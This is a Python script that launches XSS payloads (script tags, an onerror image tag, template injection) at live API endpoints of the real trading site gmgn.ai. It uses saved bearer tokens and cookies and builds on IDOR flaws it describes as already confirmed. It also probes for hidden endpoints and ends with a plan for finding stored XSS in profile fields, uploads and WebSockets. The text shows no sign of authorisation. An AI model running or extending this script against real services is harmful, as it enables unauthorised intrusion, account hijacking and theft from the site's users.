#!/usr/bin/env python3
"""
XSS + IDOR HYBRID HUNTER
Test XSS payloads in the WORKING IDOR endpoints we already confirmed
"""
import json
import requests
import time

with open("tokens.json") as f:
    tokens = json.load(f)

with open("cookies.json") as f:
    cookies = json.load(f)

ACCESS_TOKEN = tokens["access_token"]

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260712-1986-3641f8b",
    "from_app": "gmgn",
    "app_ver": "20260712-1986-3641f8b",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0"
}

# XSS payloads
PAYLOADS = [
    "{{7*7}}",
    "<script>1</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
]

print("="*80)
print("🦊 XSS IN WORKING IDOR ENDPOINTS")
print("="*80)
print("Strategy: Inject XSS into endpoints that already accept our input")
print("="*80)

results = []

# ============================================================================
# VECTOR 1: bind_invite (invite_code field)
# ============================================================================
print("\n[VECTOR 1] bind_invite - invite_code XSS")
print("=" * 60)

for payload in PAYLOADS:
    print(f"\nTesting invite_code: {payload[:50]}")
    
    try:
        r = requests.post(
            "https://gmgn.ai/tapi/v1/fourmeme/bind_invite",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={
                "chain": "bsc",
                "from_address": "0x0000000000000000000000000000000000000001",
                "invite_code": payload
            },
            timeout=15
        )
        
        print(f"Status: {r.status_code}")
        
        if r.status_code == 200:
            d = r.json()
            print(f"Code: {d.get('code')}")
            print(f"Response: {json.dumps(d, indent=2)[:300]}")
            
            if d.get("code") == 0:
                print(f"✅ PAYLOAD ACCEPTED!")
                results.append({"vector": "bind_invite.invite_code", "payload": payload})
                break
            elif d.get("code") == 40101600:
                print(f"⚠️  Trading auth required - endpoint blocked")
                break
                
        elif r.status_code == 403:
            print(f"❌ WAF blocked")
        elif r.status_code == 500:
            print(f"⚠️  Server error (payload may have bypassed WAF!)")
            
    except Exception as e:
        print(f"Error: {e}")
    
    time.sleep(0.5)

# ============================================================================
# VECTOR 2: invite_info (from_address field)
# ============================================================================
print("\n[VECTOR 2] invite_info - from_address XSS")
print("=" * 60)

for payload in PAYLOADS:
    print(f"\nTesting from_address: {payload[:50]}")
    
    try:
        r = requests.post(
            "https://gmgn.ai/tapi/v1/fourmeme/invite_info",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={
                "chain": "bsc",
                "from_address": payload
            },
            timeout=15
        )
        
        print(f"Status: {r.status_code}")
        
        if r.status_code == 200:
            d = r.json()
            print(f"Code: {d.get('code')}")
            
            if d.get("code") == 0:
                print(f"✅ ACCEPTED!")
                # Check if payload appears in response
                resp_str = json.dumps(d)
                if payload in resp_str:
                    print(f"💀 PAYLOAD REFLECTED IN RESPONSE!")
                    results.append({"vector": "invite_info.from_address (reflected)", "payload": payload})
                    break
                    
        elif r.status_code == 500:
            print(f"⚠️  Server error")
            
    except Exception as e:
        print(f"Error: {e}")
    
    time.sleep(0.5)

# ============================================================================
# VECTOR 3: dividend_info (from_address field)
# ============================================================================
print("\n[VECTOR 3] dividend_info - from_address XSS")
print("=" * 60)

for payload in PAYLOADS:
    print(f"\nTesting from_address: {payload[:50]}")
    
    try:
        r = requests.post(
            "https://gmgn.ai/xapi/v1/bsc/flap/dividend_info",
            params=PARAMS,
            headers=HEADERS,
            cookies=cookies,
            json={"from_address": payload},
            timeout=15
        )
        
        print(f"Status: {r.status_code}")
        
        if r.status_code == 200:
            d = r.json()
            print(f"Code: {d.get('code')}")
            
            if d.get("code") == 0:
                print(f"✅ ACCEPTED!")
                if payload in json.dumps(d):
                    print(f"💀 REFLECTED!")
                    results.append({"vector": "dividend_info.from_address", "payload": payload})
                    break
                    
    except Exception as e:
        print(f"Error: {e}")
    
    time.sleep(0.5)

# ============================================================================
# VECTOR 4: Get user info (check for profile fields)
# ============================================================================
print("\n[VECTOR 4] user_info - Check current profile")
print("=" * 60)

try:
    r = requests.post(
        "https://gmgn.ai/account/user_info",
        params=PARAMS,
        headers=HEADERS,
        cookies=cookies,
        json={},
        timeout=15
    )
    
    if r.status_code == 200:
        d = r.json()
        if d.get("code") == 0:
            user_data = d.get("data", {}).get("data", {})
            print(f"✅ Got user info")
            print(f"Accounts: {user_data.get('accounts', [])}")
            
            # Check if there are writable fields
            writable_fields = ["username", "bio", "nickname", "display_name"]
            print(f"\nPotential XSS fields in profile: {writable_fields}")
            print(f"Try updating these via browser console!")
            
except Exception as e:
    print(f"Error: {e}")

# ============================================================================
# VECTOR 5: Search for other endpoints via OPTIONS
# ============================================================================
print("\n[VECTOR 5] Discover more endpoints")
print("=" * 60)

# Test common endpoint patterns
test_endpoints = [
    "/account/update_profile",
    "/account/settings/update",
    "/api/v1/user/update",
    "/xapi/v1/user/profile",
    "/tapi/v1/user/settings",
]

for endpoint in test_endpoints:
    try:
        r = requests.options(
            f"https://gmgn.ai{endpoint}",
            headers=HEADERS,
            cookies=cookies,
            timeout=5
        )
        if r.status_code != 404:
            print(f"✅ {endpoint} exists! (Status: {r.status_code})")
            print(f"   Allowed methods: {r.headers.get('Allow', 'N/A')}")
    except:
        pass

# ============================================================================
# RESULTS
# ============================================================================

print("\n" + "="*80)
print("🎯 RESULTS")
print("="*80)

if results:
    print(f"\n✅ Found {len(results)} potential XSS vectors:\n")
    for r in results:
        print(f"• {r['vector']}")
        print(f"  Payload: {r['payload']}")
        print()
        
    with open("xss_found.json", "w") as f:
        json.dump(results, f, indent=2)
    
    print("💾 Saved to: xss_found.json")
    
else:
    print("\n⚠️  No XSS vectors found in IDOR endpoints")
    print("\n💡 NEXT STRATEGY:")
    print("1. Use browser DevTools Network tab to capture REAL endpoints")
    print("2. Look for form submissions (profile update, settings, etc)")
    print("3. Test file upload fields (avatar, documents)")
    print("4. Check WebSocket messages for injectable fields")
    print("5. Test GET parameters for reflected XSS")
    
print("\n🦊 Manual Browser Testing Required!")
print("Open gmgn.ai and try updating:")
print("• Profile bio/username")
print("• Wallet nicknames")
print("• Portfolio/watchlist names")
print("• Trading bot labels (if enabled)")

print("\n" + "="*80)
